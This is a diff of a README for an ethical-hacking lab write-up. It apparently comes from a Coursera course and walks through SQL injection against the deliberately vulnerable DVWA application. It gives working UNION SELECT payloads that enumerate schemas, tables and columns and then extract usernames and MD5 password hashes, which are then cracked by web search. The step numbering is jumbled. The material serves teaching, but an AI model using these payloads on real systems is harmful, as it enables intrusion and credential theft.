@@ -1,6 +1,6 @@
-<h1> ☁ # Ethical-Hacking👨🏿‍💻 </h1>
+<h1> 💉 # Ethical-Hacking👨🏿‍💻 </h1>
 <h2> Description</h2>
-<b>A SQL Injection demonstration as part of a series of hands on labs for ethical Hackings via Coursera.</b>
+<b>A SQL Injection 💉 demonstration as part of a series of hands on labs for ethical Hackings via Coursera🧪🧫 .</b>
 <br />
 
 
@@ -64,7 +64,7 @@ Note: By opening the source code we can see that the ' symbol now sits between t
 
  SELECT first_name, last_name FROM users WHERE user_id = '''
 
- 2. Now that we know it is vulnerable we will simply add the number two to see how the output.
+ 2. Now that we know it is vulnerable we will simply add the number two to understand what the format of the output, which we can see is two distinct parts: first name and surname.
 
 ![regular input](https://github.com/user-attachments/assets/afb45415-f4ef-4614-82e4-6553b2d6254d)
 
@@ -99,25 +99,57 @@ Which gives us an error and we can now deduct that there are only 2 columns.
 6. Finding the name of the database can be done by our <b>double statement</b> which again follows the regular input of 2 <b>and</b> our second statement which will be UNION SELECT database(),user() #' so all together we have our input 2' UNION SELECT database(),user() #'
 ![UNION SELECT database(),user() #'](https://github.com/user-attachments/assets/34eee87e-b610-4559-bb06-4ecf63fd14c3)
 
-1.	2' UNION SELECT database(),user() #'
-a.	Finds the name of the database and user
-b.	() syntax for the function in the code
-c.	We get the name of the databse which is dvwa and dvwa@localhost as username
+7.	Next we use 2' UNION SELECT database(),user() #' which finds the name of the database and user
 
-2.	Now 2’ UNION SELECT schema_name,2 FROM information_schema.schemata #’
+![UNION SELECT database(),user() #'](https://github.com/user-attachments/assets/800a31e4-a125-4a80-b1f0-bd834dc7759f)
+
+
+Note: we use	() because it is the syntax for the function in the code
+	We get the result in the second paragraph. We can see that the name of the databse is dvwa and dvwa@localhost is the username.
+
+8.	Now 2' UNION SELECT schema_name,2 FROM information_schema.schemata #'
 a.	The dvwa is DB for the server/application
-3.	Query for tables to see which are in the dvwa DB
-a.	2’ UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = ‘dvwa’ #’
+
+
+
+4.	Now we query for tables to see which tables are in the dvwa DB
+a.	2' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema = 'dvwa' #'
 b.	We get two tables with this query guestbook and users. So we as hackers, ethical hackers, we are more interested in the users tables
 c.	Now we want to find the columns in the tables
-4.	2’ UNION SELECT column_name,column_type FROM information_schema.columns WHERE tables_schema=’dvwa’ AND table_name = ‘users’ #’
+
+![step 8 serverapplication](https://github.com/user-attachments/assets/4eddd3d7-1c72-46e7-8526-f202a015229e)
+
+
+6.	2' UNION SELECT column_name,column_type FROM information_schema.columns WHERE table_schema='dvwa' AND table_name = 'users' #'
 a.	Column names are user name, last names, first names, user id’s, passwords, avatar
 b.	So from this we get the column types on the other output field which is noted in var(x) or int() which is basically the number of max characters that can be used in each column.
-5.	CONCAT
+
+![column names](https://github.com/user-attachments/assets/0f33f532-2051-4c1f-98ee-ea9574e281be)
+
+
+![query for tables](https://github.com/user-attachments/assets/9795fef7-ce17-4492-9ea2-90d39fcdceb5)
+
+
+8.	CONCAT
 a.	We will use this to be able two print first name and last name in the first name output AND user name and password in surname output
-b.	2’ UNION SELECT CONCAT(user_id’-‘,first_name’ ‘,last_name), CONCAT(user,’:’,password) FROM dvwa.users #’
+
+   2' UNION SELECT CONCAT(user_id, '-', first_name, ' ', last_name), CONCAT(user, ':', password) FROM dvwa.users #
+
+![passwords](https://github.com/user-attachments/assets/b3d6d90c-787f-4933-a5a2-5845b1517c87)
+
+
 c.	This gives us the username and the MD5 hash of the passwords
-d.	We then decrypt by simply googling the MD5 hash
+![MD5_hashes](https://github.com/user-attachments/assets/f4c4d35b-63fd-4b54-a8d0-1f1f085e9cdb)
+
+
+9.	We then decrypt by simply googling the MD5 hash
+
+![Googling MD5](https://github.com/user-attachments/assets/e8588f4e-81d5-419a-8e57-84c72137f3c8)
+
+![conversionfromMD5#1](https://github.com/user-attachments/assets/6f5fd4ba-7c05-4085-b6f2-992158c42e78)
+
+10.	![conversionfromMD5#2](https://github.com/user-attachments/assets/fcd0b445-eeb1-4526-80d9-e277d65d083f)
+
    
 </p>
 
